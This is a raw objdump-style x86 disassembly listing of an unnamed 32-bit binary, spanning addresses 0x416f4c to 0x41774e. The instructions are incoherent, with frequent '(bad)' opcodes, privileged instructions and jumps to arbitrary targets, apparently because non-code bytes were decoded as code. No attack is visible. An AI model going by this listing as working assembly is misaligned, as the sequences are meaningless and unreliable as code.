  416f4c:	shr    BYTE PTR [edi+0x3c1af0f],0xe0
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	js     0x416f74
  416f6c:	mov    ebp,0x7f193793
  416f71:	jo     0x416f2c
  416f73:	jle    0x416fe5
  416f75:	jo     0x416fa1
  416f77:	leave  
  416f78:	iret   
  416f79:	fisubr DWORD PTR [ebx+0x91100bc]
  416f7f:	std    
  416f80:	addr16 (bad) 
  416f82:	fcom   QWORD PTR ds:0x937b8101
  416f88:	aad    0x27
  416f8a:	mov    ds:0x404f5ef8,eax
  416f8f:	aad    0xf7
  416f91:	ins    DWORD PTR es:[edi],dx
  416f92:	push   edi
  416f93:	push   ebp
  416f94:	into   
  416f95:	shl    DWORD PTR [eax+0x7ae45e31],cl
  416f9b:	mov    ebp,0x9572dc92
  416fa0:	aaa    
  416fa1:	xor    al,0xca
  416fa3:	add    esi,esp
  416fa5:	mov    BYTE PTR [ebp+0x59],bl
  416fa8:	test   bl,dh
  416faa:	and    al,0x34
  416fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fad:	inc    BYTE PTR [edx+0x20]
  416fb0:	imul   esi,DWORD PTR [ebx+0x2c],0xffffffcb
  416fb4:	js     0x416fb6
  416fb6:	inc    ebx
  416fb7:	xlat   BYTE PTR ds:[ebx]
  416fb8:	addr16 rcr ebp,1
  416fbb:	add    BYTE PTR [ebx-0x4bbb4012],ah
  416fc1:	and    al,0xa8
  416fc3:	fwait
  416fc4:	scas   eax,DWORD PTR es:[edi]
  416fc5:	sbb    DWORD PTR [ebx+0x16],ebp
  416fc8:	sbb    al,BYTE PTR [edx-0x72]
  416fcb:	cmc    
  416fcc:	jbe    0x416f58
  416fce:	inc    ebx
  416fcf:	sbb    al,0x70
  416fd1:	in     eax,dx
  416fd2:	and    eax,0x8fc08158
  416fd7:	add    eax,0x6c5483df
  416fdc:	fadd   st,st(3)
  416fde:	jp     0x416fa6
  416fe0:	sbb    al,0x33
  416fe2:	push   esp
  416fe3:	sub    BYTE PTR [eax-0x7d],0xb1
  416fe7:	push   ebp
  416fe8:	sbb    DWORD PTR [eax+0x7f939935],esi
  416fee:	std    
  416fef:	pop    ss
  416ff0:	push   ecx
  416ff1:	mov    WORD PTR [eax+ebx*8],es
  416ff4:	ins    BYTE PTR es:[edi],dx
  416ff5:	icebp  
  416ff6:	push   ss
  416ff7:	jg     0x416f90
  416ff9:	add    BYTE PTR [eax],bh
  416ffb:	scas   al,BYTE PTR es:[edi]
  416ffc:	nop
  416ffd:	or     BYTE PTR ds:0x12bf9295,bl
  417003:	push   esi
  417004:	xchg   ebp,eax
  417005:	scas   al,BYTE PTR es:[edi]
  417006:	mov    DWORD PTR [edx],edi
  417008:	scas   eax,DWORD PTR es:[edi]
  417009:	rcl    BYTE PTR [edi],1
  41700b:	pop    ss
  41700c:	mov    dl,0x10
  41700e:	out    dx,eax
  41700f:	add    BYTE PTR [esi-0x6f],0x4a
  417013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417014:	out    dx,al
  417015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417016:	push   cs
  417017:	dec    esi
  417018:	pop    esp
  417019:	and    BYTE PTR [ebp-0x2ed8687a],ah
  41701f:	mov    WORD PTR [esi-0x69],gs
  417022:	outs   dx,DWORD PTR ds:[esi]
  417023:	push   esi
  417024:	sbb    dl,BYTE PTR [ebp+0x5bbc4059]
  41702a:	ret    
  41702b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41702c:	outs   dx,DWORD PTR ds:[esi]
  41702d:	adc    esi,DWORD PTR [edi]
  41702f:	mov    edx,0x87936bd0
  417034:	dec    ebp
  417035:	push   edi
  417036:	lock iret 
  417038:	mov    al,ds:0x9201599c
  41703d:	push   0xedc288f2
  417042:	popf   
  417043:	xor    esp,DWORD PTR [edx-0x50]
  417046:	push   ebx
  417047:	stc    
  417048:	add    al,0xeb
  41704a:	out    0xfd,al
  41704c:	bswap  esp
  41704e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41704f:	cmovl  ebx,DWORD PTR [edx+0x1e]
  417053:	popa   
  417054:	shl    DWORD PTR [ebx-0xf],0xc9
  417058:	test   al,0xe0
  41705a:	sahf   
  41705b:	daa    
  41705c:	mul    BYTE PTR [ebx-0xb]
  41705f:	mov    ?,WORD PTR [ebx+0x4a419372]
  417065:	std    
  417066:	fchs   
  417068:	je     0x416fef
  41706a:	int3   
  41706b:	test   ah,al
  41706d:	push   0xb2a0f790
  417072:	sbb    DWORD PTR [ebx],esp
  417074:	out    dx,al
  417075:	or     eax,esi
  417077:	mov    esi,0x2656a323
  41707c:	and    eax,0x7e21568b
  417081:	pop    ebx
  417082:	mov    gs,esi
  417084:	sbb    cl,al
  417086:	pop    ds
  417087:	pushf  
  417088:	call   0x69bae047
  41708d:	cmp    BYTE PTR [ecx+0xf],dh
  417090:	push   edi
  417091:	mov    ecx,0xcabb7c5c
  417096:	popa   
  417097:	cmp    al,0x14
  417099:	lea    ebx,[esi-0xc]
  41709c:	pop    ecx
  41709d:	mov    edi,0xd472ec72
  4170a2:	sbb    eax,DWORD PTR [edx-0x2594f040]
  4170a8:	ret    0x3332
  4170ab:	call   0x91b2:0xec4baad2
  4170b2:	jecxz  0x4170df
  4170b4:	xor    ecx,DWORD PTR [edx+0x15]
  4170b7:	je     0x4170b7
  4170b9:	int3   
  4170ba:	hlt    
  4170bb:	mov    DWORD PTR [edi+ebx*4+0x6b],edx
  4170bf:	test   BYTE PTR es:[edx+0x3ec75906],bh
  4170c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170c7:	call   DWORD PTR [ebp-0xb]
  4170ca:	pop    ecx
  4170cb:	dec    esp
  4170cc:	jo     0x4170c7
  4170ce:	ret    0xae2
  4170d1:	pop    ecx
  4170d2:	xor    ecx,DWORD PTR [ecx+0x504633c]
  4170d8:	push   ebx
  4170d9:	mov    ds:0x8ca33401,al
  4170de:	aaa    
  4170df:	jnp    0x41709f
  4170e1:	and    edi,eax
  4170e3:	(bad)  
  4170e4:	or     BYTE PTR [esi],bh
  4170e6:	or     BYTE PTR [ebx+0x62fc4e57],cl
  4170ec:	stc    
  4170ed:	(bad)  
  4170ee:	inc    edx
  4170ef:	cmp    bh,BYTE PTR [ebx+0x5e44bfef]
  4170f5:	mov    bl,0xbf
  4170f7:	jg     0x4170c3
  4170f9:	add    dh,BYTE PTR [esi+edx*8]
  4170fc:	in     eax,dx
  4170fd:	mov    al,ds:0xf0b3531
  417102:	xchg   ebp,esp
  417104:	loop   0x417178
  417106:	out    0xde,al
  417108:	ins    DWORD PTR es:[edi],dx
  417109:	test   ecx,edx
  41710b:	popa   
  41710c:	aaa    
  41710d:	in     eax,0xe7
  41710f:	adc    ebx,esi
  417111:	mov    al,BYTE PTR [ecx-0x63bf0b19]
  417117:	stos   BYTE PTR es:[edi],al
  417118:	loopne 0x417178
  41711a:	jg     0x417190
  41711c:	xor    bl,cl
  41711e:	adc    al,0x26
  417120:	mov    fs,WORD PTR [ecx+0x2500b112]
  417126:	jnp    0x4170b0
  417128:	arpl   ax,dx
  41712a:	dec    ecx
  41712b:	aad    0x80
  41712d:	sar    DWORD PTR [esp+esi*1-0x120f0414],0x5a
  417135:	inc    ebp
  417136:	pop    es
  417137:	test   DWORD PTR [edx+0x4c0673cc],ecx
  41713d:	fcom   DWORD PTR [edi]
  41713f:	shl    DWORD PTR [ebp+ebp*4+0x1bd1c065],cl
  417146:	int3   
  417147:	and    eax,0x7a2f5db4
  41714c:	fisub  WORD PTR [eax]
  41714e:	mov    esi,0x35de9061
  417153:	pop    ecx
  417154:	or     cl,dh
  417156:	add    DWORD PTR [edi+0x3e7fc21a],ecx
  41715c:	pop    eax
  41715d:	xchg   ebx,eax
  41715e:	jno    0x41719c
  417160:	dec    ebp
  417161:	out    0xa5,al
  417163:	sbb    ebx,ecx
  417165:	xchg   ecx,eax
  417166:	jnp    0x417124
  417168:	cwde   
  417169:	addr16 gs pop ds
  41716c:	lahf   
  41716d:	push   ss
  41716e:	lock sar DWORD PTR [ebx+0x15],0xe5
  417173:	cmp    dh,BYTE PTR [ecx-0x2f]
  417176:	push   edx
  417177:	call   DWORD PTR [ecx-0x58]
  41717a:	sub    DWORD PTR [edx-0xa58c48e],edi
  417180:	xor    DWORD PTR [esi+0x35463318],0xbfe29c28
  41718a:	or     BYTE PTR [ecx-0x44],dl
  41718d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41718e:	xor    ah,BYTE PTR [edi]
  417190:	lahf   
  417191:	mov    edx,0xce28a258
  417196:	jge    0x417172
  417198:	int    0x5b
  41719a:	sub    eax,0xd776e297
  41719f:	popf   
  4171a0:	xlat   BYTE PTR ds:[ebx]
  4171a1:	sub    al,0xd5
  4171a3:	aad    0xbb
  4171a5:	lods   al,BYTE PTR ds:[esi]
  4171a6:	xor    DWORD PTR [edi-0x5b70151d],esp
  4171ac:	xlat   BYTE PTR ds:[ebx]
  4171ad:	aas    
  4171ae:	out    0x99,eax
  4171b0:	retf   
  4171b1:	jp     0x41719c
  4171b3:	out    dx,al
  4171b4:	mov    ebx,0x37a18ec7
  4171b9:	dec    edi
  4171ba:	jge    0x4171ac
  4171bc:	pop    es
  4171bd:	fs push es
  4171bf:	adc    BYTE PTR [edx-0x4429580d],bh
  4171c5:	iret   
  4171c6:	mov    edi,0x5ad1b40f
  4171cb:	sbb    BYTE PTR [eax],0x79
  4171ce:	mov    edx,0xf02370d3
  4171d3:	cmp    al,0xa2
  4171d5:	out    dx,eax
  4171d6:	inc    esi
  4171d7:	push   cs
  4171d8:	mov    esp,0x94badcd
  4171dd:	or     esi,eax
  4171df:	cmp    eax,0x5c0015c2
  4171e4:	push   eax
  4171e5:	sub    eax,0x3582b860
  4171ea:	mov    ch,BYTE PTR [eax]
  4171ec:	aaa    
  4171ed:	and    DWORD PTR [edx-0x63ae2b67],edi
  4171f3:	cmp    al,0xe4
  4171f5:	sbb    dl,ah
  4171f7:	jne    0x4171fd
  4171f9:	sahf   
  4171fa:	xor    ebx,DWORD PTR [esi-0x67be61c0]
  417200:	sbb    esp,DWORD PTR [ebx-0x28]
  417203:	in     eax,dx
  417204:	cmp    esi,ecx
  417206:	daa    
  417207:	fiadd  DWORD PTR ds:0x847ad77
  41720d:	shl    DWORD PTR ds:0x4bd05efb,0xb
  417214:	xchg   edx,eax
  417215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417216:	xchg   ebx,eax
  417217:	add    al,0x8a
  417219:	push   edi
  41721a:	retf   0x1e74
  41721d:	mov    esp,DWORD PTR [ebp+0x7e923467]
  417223:	test   al,0x78
  417225:	xor    DWORD PTR ds:0x9565df2f,ebp
  41722b:	aas    
  41722c:	xlat   BYTE PTR ds:[ebx]
  41722d:	inc    esp
  41722e:	and    eax,0x1bbd4584
  417233:	mov    ecx,0xe042451c
  417238:	jbe    0x4171c7
  41723a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41723b:	out    0xcb,eax
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	pop    ebx
  417255:	add    dh,al
  417257:	je     0x4172c9
  417259:	es jg  0x4172cc
  41725c:	mov    ecx,0x2070707e
  417261:	stos   DWORD PTR es:[edi],eax
  417262:	lods   al,BYTE PTR ds:[esi]
  417263:	movntq (bad),mm3
  417264:	out    0xdf,eax
  417266:	xchg   esi,eax
  417267:	int    0x19
  417269:	mov    DWORD PTR [eax],ecx
  41726b:	loope  0x417200
  41726d:	lea    ebx,[esp+esi*2]
  417270:	sub    eax,0x94c6120f
  417275:	add    eax,0x7c216e3
  41727a:	shl    DWORD PTR [ecx],cl
  41727c:	loope  0x41729e
  41727e:	sbb    BYTE PTR [edi],0x7f
  417281:	jl     0x4172a9
  417283:	popf   
  417284:	xor    ecx,DWORD PTR [ebx]
  417286:	xchg   edi,eax
  417287:	imul   esp,DWORD PTR [ebp-0x59],0x5d
  41728b:	mov    ch,0xfd
  41728d:	add    DWORD PTR [edx+0x3273fc7f],esp
  417293:	jnp    0x417297
  417295:	ret    
  417296:	cmc    
  417297:	(bad)  
  417298:	dec    esi
  417299:	jg     0x417247
  41729b:	push   esi
  41729c:	push   ecx
  41729d:	pop    esi
  41729e:	xlat   BYTE PTR ds:[ebx]
  41729f:	or     bl,BYTE PTR [edi+0x5c]
  4172a2:	(bad)  
  4172a3:	fsubp  st(1),st
  4172a5:	push   cs
  4172a6:	mov    dl,0xe9
  4172a8:	dec    edx
  4172a9:	inc    esp
  4172aa:	out    dx,eax
  4172ab:	xor    DWORD PTR [ecx+0x1ad1965f],edi
  4172b1:	inc    ebx
  4172b2:	(bad)  
  4172b3:	mov    edx,0x7087394b
  4172b8:	loope  0x417304
  4172ba:	ja     0x41730b
  4172bc:	int3   
  4172bd:	mov    eax,ds:0x36bbec54
  4172c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172c3:	mov    cl,0xe6
  4172c5:	pop    edx
  4172c6:	lock inc edx
  4172c8:	mov    eax,0x1922fac
  4172cd:	enter  0x101c,0xca
  4172d1:	rcl    al,cl
  4172d3:	dec    ecx
  4172d4:	push   eax
  4172d5:	repnz or bl,BYTE PTR [esi+eiz*8]
  4172d9:	sbb    DWORD PTR [eax],edx
  4172db:	pop    ebx
  4172dc:	std    
  4172dd:	and    BYTE PTR [eax-0x4c25791d],bl
  4172e3:	push   esp
  4172e4:	dec    ebp
  4172e5:	imul   esi,DWORD PTR [edx+0x22],0xffffffb8
  4172e9:	inc    esi
  4172ea:	sbb    edi,0x782b30b
  4172f0:	dec    eax
  4172f1:	(bad)  
  4172f2:	add    ebp,DWORD PTR [ebx]
  4172f4:	and    al,0x95
  4172f6:	shl    dl,0xe4
  4172f9:	out    dx,eax
  4172fa:	in     eax,0xaa
  4172fc:	je     0x4172e4
  4172fe:	pusha  
  4172ff:	lods   eax,DWORD PTR ds:[esi]
  417300:	push   ebp
  417301:	cs pop ebp
  417303:	xor    DWORD PTR [esp+esi*1-0x68],0xffffffac
  417308:	push   edx
  417309:	call   0x42128200
  41730e:	jl     0x4172e2
  417310:	mov    edi,0xf6a9e0c6
  417315:	popa   
  417316:	xor    al,cl
  417318:	shl    DWORD PTR [eax+0x31dfadda],1
  41731e:	in     al,0xbe
  417320:	aaa    
  417321:	mov    ecx,0x797bf480
  417326:	in     eax,0xa8
  417328:	push   ebx
  417329:	mov    al,ds:0x3aaeff63
  41732e:	adc    al,0x7
  417330:	xlat   BYTE PTR ds:[ebx]
  417331:	mov    dl,0x88
  417333:	ret    
  417334:	xlat   BYTE PTR ds:[ebx]
  417335:	and    dh,BYTE PTR [eax+0x6a490736]
  41733b:	(bad)  
  41733c:	mov    edx,0xf440fd4c
  417341:	jp     0x4173a1
  417343:	(bad)  
  417344:	scas   eax,DWORD PTR es:[edi]
  417345:	mov    ecx,0xee3214e4
  41734a:	aad    0x3f
  41734c:	or     DWORD PTR [edi-0x6daa166],0x16
  417353:	fldcw  WORD PTR [ebx]
  417355:	xchg   BYTE PTR [edi],dh
  417357:	push   ecx
  417358:	xor    eax,0x137426cc
  41735d:	jne    0x417355
  41735f:	fisttp DWORD PTR [edx+0x50c3c89d]
  417365:	rcr    BYTE PTR [esi-0x7988d6f2],1
  41736b:	shl    edi,0x7e
  41736e:	jg     0x4173a7
  417370:	ret    
  417371:	xor    DWORD PTR [edx-0x1074f2cf],edx
  417377:	inc    edi
  417378:	mov    esp,esi
  41737a:	sbb    DWORD PTR [edi-0x3c6b56e],esi
  417380:	dec    esp
  417381:	repz and BYTE PTR [eax+0x355febaa],dl
  417388:	outs   dx,BYTE PTR ds:[esi]
  417389:	loopne 0x4173f3
  41738b:	into   
  41738c:	xchg   ecx,eax
  41738d:	stos   DWORD PTR es:[edi],eax
  41738e:	pusha  
  41738f:	mov    eax,0xfff253b3
  417394:	aaa    
  417395:	lea    esi,[ecx+0x5b2ad4f7]
  41739b:	xor    ebp,DWORD PTR [edx+0x7fee1b59]
  4173a1:	cmp    al,0x19
  4173a3:	jmp    0x4173a8
  4173a5:	or     al,0x27
  4173a7:	jns    0x4173f4
  4173a9:	cmp    edi,DWORD PTR [ecx]
  4173ab:	shl    DWORD PTR [esi+0x15f1f320],1
  4173b1:	retf   
  4173b2:	mov    al,ds:0x4a8bba0a
  4173b7:	(bad)  
  4173b8:	sbb    eax,0xf17cb6e6
  4173bd:	fldcw  WORD PTR [edi+0x7e]
  4173c0:	sbb    DWORD PTR [ebp-0x2],esp
  4173c3:	mov    ?,edx
  4173c5:	leave  
  4173c6:	repz mov edi,0x1d55890e
  4173cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173cd:	mov    dh,BYTE PTR [edx-0x6d2b2ef6]
  4173d3:	jbe    0x417434
  4173d5:	std    
  4173d6:	cmp    BYTE PTR [edi+0x1f],bl
  4173d9:	sub    al,0x52
  4173db:	fstp   DWORD PTR [ebx]
  4173dd:	sbb    eax,0x3104eb9a
  4173e2:	mov    esi,0x3f01cd3f
  4173e7:	dec    ebx
  4173e8:	cld    
  4173e9:	rcl    BYTE PTR [esi-0x392c5809],cl
  4173ef:	lea    eax,[esi-0x26]
  4173f2:	add    bh,cl
  4173f4:	jle    0x417440
  4173f6:	xor    al,BYTE PTR [eax]
  4173f8:	ficomp WORD PTR [edi-0x3f]
  4173fb:	in     eax,0xd2
  4173fd:	cmp    esp,DWORD PTR [ebx]
  4173ff:	fstp   DWORD PTR [edx-0x52]
  417402:	add    eax,0x984fa102
  417407:	ret    
  417408:	bound  ecx,QWORD PTR ds:0x46742688
  41740e:	call   0x3dcb:0xb5d85e84
  417415:	cmp    bl,BYTE PTR [edx+edx*2+0x3d06a451]
  41741c:	shl    DWORD PTR [esi-0x7],cl
  41741f:	xor    al,0x7f
  417421:	sti    
  417422:	(bad)  
  417423:	out    0x84,al
  417425:	pop    ecx
  417426:	lea    eax,[ebx+eax*8+0x3f35452c]
  41742d:	wrmsr  
  41742f:	cwde   
  417430:	outs   dx,DWORD PTR ds:[esi]
  417431:	arpl   WORD PTR [ecx-0x5f495c8f],ax
  417437:	and    esp,DWORD PTR [esp]
  41743a:	inc    esp
  41743b:	sbb    al,0x7c
  41743d:	retf   0xdc5
  417440:	iret   
  417441:	repnz and DWORD PTR [ebp+0x4b],ebp
  417445:	(bad)  
  417446:	sbb    eax,0x941144e5
  41744b:	fs mov ebp,0xf425134e
  417451:	cmp    DWORD PTR [ebx+edi*8-0x71],0xffffffa1
  417456:	pusha  
  417457:	dec    esp
  417458:	jg     0x417425
  41745a:	push   ebp
  41745b:	jno    0x417418
  41745d:	aaa    
  41745e:	inc    ebx
  41745f:	shl    DWORD PTR [edx],1
  417461:	cli    
  417462:	and    DWORD PTR [esi],esp
  417464:	or     ebx,DWORD PTR [ebx-0x49]
  417467:	xchg   ebx,eax
  417468:	cmp    bl,BYTE PTR [edx+0x28]
  41746b:	scas   eax,DWORD PTR es:[edi]
  41746c:	in     al,0xa9
  41746e:	in     eax,0x95
  417470:	lahf   
  417471:	pop    esp
  417472:	push   ebx
  417473:	enter  0x2edd,0xb5
  417477:	dec    edx
  417478:	jle    0x417474
  41747a:	leave  
  41747b:	fmul   st,st(2)
  41747d:	fdivr  st(7),st
  41747f:	dec    edi
  417480:	adc    DWORD PTR [ecx+0x35f2989a],ebx
  417486:	or     al,0x19
  417488:	fidivr WORD PTR [edi+0x57fd9cb6]
  41748e:	adc    DWORD PTR [eax+0x18],eax
  417491:	aas    
  417492:	mov    ecx,gs
  417494:	je     0x417441
  417496:	imul   esi,ebp,0xfffffff6
  417499:	lods   eax,DWORD PTR ds:[esi]
  41749a:	lahf   
  41749b:	sbb    BYTE PTR [eax+esi*2+0x25122bc5],ah
  4174a2:	mov    ecx,0xe371a72c
  4174a7:	int    0xdc
  4174a9:	inc    edi
  4174aa:	iret   
  4174ab:	mov    dl,0x7c
  4174ad:	into   
  4174ae:	sbb    al,0x29
  4174b0:	fst    QWORD PTR [edx]
  4174b2:	push   ecx
  4174b3:	and    eax,0xab4e0a5d
  4174b8:	sub    eax,esp
  4174ba:	or     ah,BYTE PTR [ecx]
  4174bc:	jnp    0x41748d
  4174be:	outs   dx,DWORD PTR ds:[esi]
  4174bf:	call   0x9169:0xb05ed381
  4174c6:	jns    0x4174ed
  4174c8:	push   ebx
  4174c9:	inc    ebx
  4174ca:	jmp    0x417531
  4174cc:	or     eax,0x6ffd6c4b
  4174d1:	push   edx
  4174d2:	xor    ah,0x37
  4174d5:	xchg   ebp,eax
  4174d6:	sbb    DWORD PTR [ecx-0x78b38152],edi
  4174dc:	(bad)  [ebx]
  4174de:	ficom  DWORD PTR [edi+ecx*8]
  4174e1:	test   eax,0xfd5b096f
  4174e6:	call   0xfe9a:0xabe44c61
  4174ed:	dec    esi
  4174ee:	iret   
  4174ef:	dec    ebx
  4174f0:	and    al,0x85
  4174f2:	mov    eax,ds:0xb08c5973
  4174f7:	lea    ebx,[eax]
  4174f9:	lds    eax,FWORD PTR [ecx]
  4174fb:	pushf  
  4174fc:	jmp    0xd34e60f5
  417501:	aam    0x52
  417503:	adc    eax,0x61216259
  417508:	push   ss
  417509:	pop    edx
  41750a:	mov    edx,0x4606edc1
  41750f:	and    al,0x1f
  417511:	test   al,0x52
  417513:	call   0xd5c0:0x259570a0
  41751a:	dec    ebp
  41751b:	jno    0x417579
  41751d:	cs jno 0x4174ad
  417520:	mov    edx,0x4d9006ae
  417525:	xchg   esp,eax
  417526:	js     0x41755b
  417528:	rol    BYTE PTR [ecx],cl
  41752a:	pop    ebp
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    eax,esp
  417543:	loop   0x4174e3
  417545:	and    DWORD PTR [ecx-0x468f80dc],edi
  41754b:	jle    0x4175bd
  41754d:	jo     0x4174e7
  41754f:	lock xchg DWORD PTR [eax-0xd1c3996],eax
  417556:	enter  0x5222,0x3e
  41755a:	outs   dx,BYTE PTR ds:[esi]
  41755b:	loop   0x41759a
  41755d:	sub    BYTE PTR ss:[ebx+ecx*8-0x45],ah
  417562:	pop    ecx
  417563:	mov    ebp,0x49a1e669
  417568:	lock or eax,0x23bc8161
  41756e:	pop    esp
  41756f:	cmc    
  417570:	arpl   WORD PTR [ecx+edx*2-0x189e8a05],ax
  417577:	clc    
  417578:	rol    DWORD PTR [eax+0x4e],0x48
  41757c:	mov    bh,0x13
  41757f:	(bad)  
  417580:	arpl   WORD PTR [esi+ebx*4],cx
  417583:	xchg   ebp,eax
  417584:	cdq    
  417585:	dec    eax
  417586:	sbb    DWORD PTR [ecx-0x65],esi
  417589:	shl    BYTE PTR [ebp+0x42507e31],0x6b
  417590:	jg     0x41756d
  417592:	or     edx,ecx
  417594:	je     0x4175e0
  417596:	xchg   esi,eax
  417597:	cmp    edx,DWORD PTR [ebx+esi*4+0x368dfcab]
  41759e:	push   esp
  41759f:	push   esi
  4175a0:	test   al,0x3d
  4175a2:	adc    edx,DWORD PTR [ebp-0x61]
  4175a5:	ss stos BYTE PTR es:[edi],al
  4175a7:	sub    eax,0x8128607a
  4175ac:	adc    ecx,esp
  4175ae:	and    DWORD PTR [edi-0x6c116cde],0x8b2881de
  4175b8:	mov    esp,0x743b399c
  4175bd:	lea    ebx,[edx]
  4175bf:	pop    ebx
  4175c0:	or     esp,DWORD PTR [eax-0x5d]
  4175c3:	rol    DWORD PTR [ebp+0x33712134],1
  4175c9:	sbb    eax,0x382c278c
  4175ce:	iret   
  4175cf:	add    bh,0x11
  4175d2:	sbb    al,bl
  4175d4:	xor    DWORD PTR [eax],edi
  4175d6:	gs dec edx
  4175d8:	stc    
  4175d9:	out    0x8c,al
  4175db:	sbb    al,0xfb
  4175dd:	and    ch,BYTE PTR [edx+0x7a1e2ef8]
  4175e3:	push   ebx
  4175e4:	std    
  4175e5:	out    dx,eax
  4175e6:	cli    
  4175e7:	push   cs
  4175e8:	xor    eax,0xb15a92fd
  4175ed:	into   
  4175ee:	int3   
  4175ef:	repnz iret 
  4175f1:	or     DWORD PTR [eax-0x3be35649],0x131e020d
  4175fb:	(bad)  
  4175fc:	pop    ds
  4175fd:	sbb    ah,cl
  4175ff:	outs   dx,BYTE PTR ds:[esi]
  417600:	fld    DWORD PTR [ebp-0x3e]
  417603:	pop    edx
  417604:	add    eax,0x97f1494b
  417609:	sbb    esi,DWORD PTR [esi]
  41760b:	sti    
  41760c:	cmc    
  41760d:	popf   
  41760e:	outs   dx,DWORD PTR ds:[esi]
  41760f:	xor    eax,0x5e57c8bf
  417614:	cli    
  417615:	pop    ecx
  417616:	xor    al,0x59
  417618:	jnp    0x41760b
  41761a:	scas   eax,DWORD PTR es:[edi]
  41761b:	dec    ebx
  41761c:	push   0xc4c5e646
  417621:	js     0x417609
  417623:	lock push ecx
  417625:	jns    0x41766a
  417627:	lock push cs
  417629:	adc    BYTE PTR [ecx],bh
  41762b:	(bad)  
  41762c:	(bad)
  41762f:	push   ds
  417630:	ins    BYTE PTR es:[edi],dx
  417631:	jge    0x417600
  417633:	push   esp
  417634:	pop    esi
  417635:	mov    esi,0xbe57b086
  41763a:	push   edi
  41763b:	mov    bh,0xf8
  41763d:	pop    ecx
  41763e:	dec    edi
  41763f:	xor    DWORD PTR [ecx+0x6782b05f],edi
  417645:	out    0xfb,al
  417647:	xor    dh,BYTE PTR [edi]
  417649:	mov    ebp,0x8738febf
  41764e:	xchg   dl,dl
  417650:	mov    ch,BYTE PTR [esi+0x550f3412]
  417656:	imul   BYTE PTR [ebp+0x3da83238]
  41765c:	or     esi,0x4a80cbc7
  417662:	sub    ah,BYTE PTR [edx-0x6b7b0eda]
  417668:	ins    DWORD PTR es:[edi],dx
  417669:	int    0x42
  41766b:	push   eax
  41766c:	or     DWORD PTR [eax+0x66],esi
  41766f:	inc    esi
  417670:	or     al,0xb8
  417672:	test   al,0x8a
  417674:	fdivr  DWORD PTR [edx+0x14]
  417677:	in     al,0x91
  417679:	mov    bl,BYTE PTR [ebx-0x428912b9]
  41767f:	mov    esi,0xbe8a9750
  417684:	pushf  
  417685:	push   es
  417686:	push   es
  417687:	ss adc ebx,0xfffffffa
  41768b:	mov    esi,0x9d01fb7d
  417690:	rcr    dl,cl
  417692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417693:	pop    ss
  417694:	mov    cl,0x7c
  417696:	cmp    edx,DWORD PTR [ebx+edi*8]
  417699:	adc    eax,0xbea502cc
  41769e:	mov    edx,0xfd863e04
  4176a3:	push   0xffffffd0
  4176a5:	out    0x5a,al
  4176a7:	xor    ebx,DWORD PTR [ecx]
  4176a9:	(bad)
  4176ac:	lock mov eax,ds:0x996e10e
  4176b2:	into   
  4176b3:	xchg   edi,eax
  4176b4:	repz loop 0x4176f0
  4176b7:	push   DWORD PTR [ebx-0x6d]
  4176ba:	add    ebx,0x7f8930af
  4176c0:	cmp    edi,DWORD PTR [ebp-0x70]
  4176c3:	nop
  4176c4:	pop    ecx
  4176c5:	xlat   BYTE PTR ds:[ebx]
  4176c6:	mov    edi,0x3068116f
  4176cb:	sub    ch,BYTE PTR [ebp-0x1e36a7d4]
  4176d1:	adc    BYTE PTR [edx-0x28623797],al
  4176d7:	mov    bl,0x72
  4176d9:	fmul   DWORD PTR [ebx+0x4651ae2a]
  4176df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176e0:	cmp    cl,BYTE PTR [edx+0x57d5debe]
  4176e6:	(bad)  
  4176e7:	call   0x6673a36f
  4176ec:	arpl   si,bp
  4176ee:	xchg   esp,eax
  4176ef:	sub    eax,DWORD PTR [ecx]
  4176f1:	into   
  4176f2:	int    0x38
  4176f4:	inc    esi
  4176f5:	imul   esi,DWORD PTR [edx+ecx*1-0x2a],0x3b
  4176fa:	fs inc edx
  4176fc:	inc    esp
  4176fd:	cmc    
  4176fe:	and    esi,edx
  417700:	leave  
  417701:	mov    ecx,0xbb67388a
  417706:	jne    0x417725
  417708:	add    eax,0xb72863ab
  41770d:	retf   0x3f2d
  417710:	jge    0x41774b
  417712:	imul   esp,DWORD PTR [edi+0x78355c9b],0x1c5f6797
  41771c:	clc    
  41771d:	nop
  41771e:	dec    esp
  41771f:	imul   edi,DWORD PTR [ebx+0x76a423d3],0x70ec3982
  417729:	retf   0x26d7
  41772c:	aaa    
  41772d:	jmp    0x4177a8
  41772f:	push   edx
  417730:	dec    ebx
  417731:	test   eax,0x4c082409
  417736:	or     bl,bl
  417738:	push   DWORD PTR [eax]
  41773a:	inc    esi
  41773b:	mov    ebx,0x6700f488
  417740:	sub    DWORD PTR [esi-0xd059efb],0x95caae4e
  41774a:	mov    al,0x90
  41774c:	dec    ecx
  41774d:	push   edi
  41774e:	push   eax
